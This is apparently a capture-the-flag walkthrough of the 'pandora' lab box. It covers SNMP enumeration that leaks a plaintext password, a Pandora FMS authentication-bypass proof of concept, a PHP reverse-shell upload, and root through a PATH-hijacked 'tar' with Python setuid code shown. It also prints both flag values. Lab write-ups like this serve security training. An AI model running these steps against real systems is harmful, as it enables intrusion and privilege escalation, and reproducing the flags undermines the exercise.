# 10.10.11.136

ping ttl - 63 - linux box
### nmap 10.10.11.136
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Tried Enumerating the HTTP webapp
    - nothing on directory listing, subdomains, vhosts, recursive listing

### nmap -sU 10.10.11.136
```
PORT    STATE SERVICE
161/udp open  snmp
```

- Trying onesixtyone, SNMPwalk
- onesixtyone returns the community string - `public`
- braa public@10.10.11.136:\.1\.3\.6\.\*
    - let it run for a while
```
10.10.11.136:46ms:.0:Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.10.11.136:47ms:.0:.10
10.10.11.136:22ms:.0:2107574
10.10.11.136:46ms:.0:Daniel
10.10.11.136:22ms:.0:pandora
10.10.11.136:47ms:.0:Mississippi
10.10.11.136:22ms:.0:72
10.10.11.136:46ms:.0:9
iso.3.6.1.2.1.25.4.2.1.5.759 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.764 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.765 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.768 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.771 = ""
iso.3.6.1.2.1.25.4.2.1.5.772 = ""
iso.3.6.1.2.1.25.4.2.1.5.801 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.821 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.839 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.844 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.846 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.855 = ""
iso.3.6.1.2.1.25.4.2.1.5.880 = ""
iso.3.6.1.2.1.25.4.2.1.5.883 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.950 = ""
iso.3.6.1.2.1.25.4.2.1.5.963 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.975 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1003 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1004 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1005 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1006 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1007 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1090 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1134 = ""
```

- ssh daniel@10.10.11.136
    - HotelBabylon23

- `matt` has `user.txt`
- checking /var/www/
    - we have the normal html app that we saw and a `pandora` app
- `netstat -tunlp` shows no internal ports running this app
- checking `/etc/apache2/sites-available` or `sites-enabled`
    - we see virtual host running `pandora` on `localhost:80`
- now, we do local port forwarding - forward our local port to a remote port so that all data sent to our local port is forwarded to the remote port
- `ssh -L 8080:localhost:80 daniel@ip`
- accessing `localhost:8080` on our browser we see the `Pandora FMS v7.0NG.742_FIX_PERL2020` running
- default creds dont work on this
- checking for CVEs [here](https://pandorafms.com/en/security/common-vulnerabilities-and-exposures/) 
- USING THIS POC First - https://github.com/ibnuuby/CVE-2021-32099
    - we go the link above
    - in another tab, we navigate to the site again and see that we are logged in.
- In `ADMIN TOOLS` we see a file manager
    - https://k4m1ll0.com/cve-2020-7935.html
    - trying to access the file location using the browser - `localhost:8080/images` we get the directory listing
    - any file uploaded here can be accessed
    - uploading a PHP reverse shell and starting a nc listener
    - accessing the reverse shell using directory listing, we get the NC reverse shell
- we get a shell as MATT. get the user flag - 7d0e61427bbd30fa3058dbe7341ea27c

### Privesc
- Create SSH access for MATT
    - `ssh-keygen` to save a new `id_rsa` in `.ssh` for matt
    - `cat id_rsa.pub > authorized_keys`
    - `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys`
    - send id_rsa to kali
    - `chmod 600 id_rsa`
    - `ssh -i id_rsa matt@ip`
- Now we have SSH as MATT
- Running LinEnum.sh we see `/usr/bin/pandora_backup` is allowed access by `matt`
- seems like a backup is created of `/var/www/pandora` and is being stored in `/root/.backup`
- The complete command being something like:
    `tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*`
- this will require root privs to run as we are creating a file in /root/.backups
- tried manipulating the wildcard (`*`) using `--checkpoint`
    - did not work as it was rendering the complete filename `/var/www/pandora/pandora_console/--checkpoint` without spaces
- notice that the complete `/usr/bin/tar` path isnt given.
- we can resort to PATH manipulation for tar
- `export $PATH=/tmp/evilbin:$PATH`
- create a tar in `/tmp/evilbin`
```
#/bin/bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
OR
```
#!/usr/bin/env python3
import os
os.setuid(0)
os.system("/bin/bash")
```

- `chmod +x tar`
- `/usr/bin/pandora_backup` will land us a root shell - 8b2410e504b53fca8a0d15fe839277b6
